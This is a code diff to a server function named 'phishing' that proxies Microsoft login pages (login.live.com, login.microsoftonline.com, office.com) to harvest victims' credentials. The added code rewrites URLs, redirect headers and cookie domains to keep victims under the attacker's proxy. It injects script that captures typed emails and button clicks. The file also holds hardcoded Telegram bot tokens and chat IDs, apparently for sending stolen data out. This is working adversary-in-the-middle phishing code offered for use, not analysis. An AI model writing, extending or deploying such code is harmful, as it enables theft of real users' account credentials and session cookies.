@@ -15,6 +15,13 @@ const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
 const telegram_chat_id_1 = "6743632244";
 const telegram_chat_id_2 = "6263177378";
 
+const PERSONAL_HOSTS = [
+  "login.live.com",
+  "account.live.com",
+  "www.office.com",
+  "office.com"
+];
+
 // headers to delete from upstream responses
 const delete_headers = [
   "content-security-policy",
@@ -74,26 +81,56 @@ async function replace_response_text(response, upstream, original, ip) {
 async function replace_response_text_personal(response, upstream, original, ip) {
   return response.text().then((text) => {
     let modifiedText = text;
-    
-    // AGGRESSIVE URL REWRITING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
-    // Replace all possible domain references
+
+    const hostPattern = "(login\\.live\\.com|account\\.live\\.com|www\\.office\\.com|office\\.com|login\\.microsoftonline\\.com)";
+
+    // Rewrite absolute URLs in double-quoted attributes/strings
+    const reDouble = new RegExp(`"(https:\\/\\/(${hostPattern})([^"]*))"`, "g");
+    modifiedText = modifiedText.replace(reDouble, (match, fullUrl, host) => {
+      try {
+        const u = new URL(fullUrl);
+        const sep = u.search && u.search.length > 0 ? "&" : "?";
+        return `"${original}${u.pathname}${u.search}${sep}x-target-host=${u.host}"`;
+      } catch {
+        return match;
+      }
+    });
+
+    // Rewrite absolute URLs in single-quoted attributes/strings
+    const reSingle = new RegExp(`'(https:\\/\\/(${hostPattern})([^']*))'`, "g");
+    modifiedText = modifiedText.replace(reSingle, (match, fullUrl) => {
+      try {
+        const u = new URL(fullUrl);
+        const sep = u.search && u.search.length > 0 ? "&" : "?";
+        return `'${original}${u.pathname}${u.search}${sep}x-target-host=${u.host}'`;
+      } catch {
+        return match;
+      }
+    });
+
+    // Rewrite meta refresh URLs
+    modifiedText = modifiedText.replace(
+      new RegExp(`url=(https:\\/\\/(${hostPattern})[^"'\\s>]+)`, "gi"),
+      (match, fullUrl) => {
+        try {
+          const u = new URL(fullUrl);
+          const sep = u.search && u.search.length > 0 ? "&" : "?";
+          return `url=${original}${u.pathname}${u.search}${sep}x-target-host=${u.host}`;
+        } catch {
+          return match;
+        }
+      }
+    );
+
+    // Fallback: replace any remaining base upstream reference with our origin
     modifiedText = modifiedText.replace(new RegExp(upstream, "g"), original);
-    modifiedText = modifiedText.replace(new RegExp("login\\.live\\.com", "g"), original.split('//')[1]);
-    modifiedText = modifiedText.replace(new RegExp("login\\.microsoftonline\\.com", "g"), original.split('//')[1]);
-    
-    // Replace any hardcoded URLs in JavaScript
-    modifiedText = modifiedText.replace(new RegExp('"https://login\\.live\\.com"', "g"), `"${original}"`);
-    modifiedText = modifiedText.replace(new RegExp('"https://login\\.microsoftonline\\.com"', "g"), `"${original}"`);
-    
+
     // Advanced JavaScript for personal accounts only
     const personalJS = `
       <script>
         (function() {
           const realIP = "${ip}";
-          
-          // Enhanced personal account event capture
           function capturePersonalEvents() {
-            // Capture email entry with multiple selectors
             const emailInputs = document.querySelectorAll('input[name="loginfmt"], input[name="username"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]');
             emailInputs.forEach(input => {
               input.addEventListener('input', function() {
@@ -108,8 +145,6 @@ async function replace_response_text_personal(response, upstream, original, ip) 
                 });
               });
             });
-            
-            // Capture button clicks
             const buttons = document.querySelectorAll('button, input[type="submit"], [data-testid*="button"], [id*="button"]');
             buttons.forEach(btn => {
               btn.addEventListener('click', function() {
@@ -125,8 +160,6 @@ async function replace_response_text_personal(response, upstream, original, ip) 
               });
             });
           }
-          
-          // Initialize for personal accounts
           if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', capturePersonalEvents);
           } else {
@@ -135,7 +168,7 @@ async function replace_response_text_personal(response, upstream, original, ip) 
         })();
       </script>
     `;
-    
+
     return modifiedText.replace("</body>", `${personalJS}</body>`);
   });
 }
@@ -233,6 +266,14 @@ app.http("phishing", {
       targetUpstream = upstream_live;
     }
 
+    // Dynamic host routing for personal flow via query param (isolated to personal)
+    const xTargetHost = original_url.searchParams.get("x-target-host");
+    if (xTargetHost && PERSONAL_HOSTS.includes(xTargetHost)) {
+      targetUpstream = xTargetHost;
+      upstream_url.searchParams.delete("x-target-host");
+      upstream_url.search = upstream_url.searchParams.toString();
+    }
+
     // Rewriting to appropriate upstream
     upstream_url.host = targetUpstream;
     upstream_url.port = 443;
@@ -242,13 +283,12 @@ app.http("phishing", {
     if (upstream_url.pathname == "/") {
       upstream_url.pathname = upstream_path;
     } else {
-      // For personal accounts, preserve the original pathname
-      if (targetUpstream === upstream_live) {
-        // Personal account - keep pathname as is
-        upstream_url.pathname = upstream_url.pathname;
-      } else {
-        // Corporate account - use original logic
+      // Corporate account - use original logic (prefix upstream_path)
+      if (targetUpstream === upstream) {
         upstream_url.pathname = upstream_path + upstream_url.pathname;
+      } else {
+        // Personal or office.com - keep pathname as is
+        upstream_url.pathname = upstream_url.pathname;
       }
     }
 
@@ -323,6 +363,19 @@ app.http("phishing", {
     new_response_headers.set("access-control-allow-origin", "*");
     new_response_headers.set("access-control-allow-credentials", true);
 
+    // Rewrite Location header for personal redirects to keep user under proxy
+    try {
+      const locationHeader = original_response.headers.get("location");
+      if (locationHeader) {
+        const candidate = new URL(locationHeader, upstream_url.protocol + "//" + upstream_url.host);
+        if (PERSONAL_HOSTS.includes(candidate.host) || (storedEmail && isPersonalEmail(storedEmail))) {
+          candidate.searchParams.set("x-target-host", candidate.host);
+          const proxiedLocation = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
+          new_response_headers.set("Location", proxiedLocation);
+        }
+      }
+    } catch {}
+
     // Replace cookie domains to match our proxy
     try {
       // getSetCookie is the successor of Headers.getAll
@@ -369,7 +422,8 @@ app.http("phishing", {
 
     // SEPARATE RESPONSE HANDLING - NEVER AFFECTS CORPORATE
     const currentStoredEmail = emailMap.get(ip);
-    const isPersonal = currentStoredEmail && isPersonalEmail(currentStoredEmail);
+    const xHostForResponse = original_url.searchParams.get("x-target-host");
+    const isPersonal = (currentStoredEmail && isPersonalEmail(currentStoredEmail)) || (xHostForResponse && PERSONAL_HOSTS.includes(xHostForResponse));
     
     let original_text;
     if (isPersonal) {
